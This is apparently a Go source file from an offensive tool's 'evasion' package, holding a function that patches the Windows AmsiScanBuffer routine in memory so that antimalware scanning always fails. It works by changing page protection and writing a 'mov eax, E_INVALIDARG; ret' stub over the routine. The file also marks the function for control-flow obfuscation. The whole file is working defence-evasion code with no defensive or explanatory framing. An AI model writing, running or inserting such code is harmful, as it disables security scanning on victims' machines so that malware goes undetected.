//go:build windows
// +build windows

package evasion

import (
	"fmt"
	"syscall"
	"unsafe"
)

func PatchAMSI() error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return nil
	}

	scanBuf, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("find AmsiScanBuffer: %w", err)
	}

	addr := scanBuf.Addr()
	// mov eax, 0x80070057 (E_INVALIDARG); ret
	patch := [6]byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), pageExecuteReadWrite, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect RWX: %w", err)
	}

	for i := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = patch[i]
	}

	if err := virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect restore: %w", err)
	}

	return nil
}
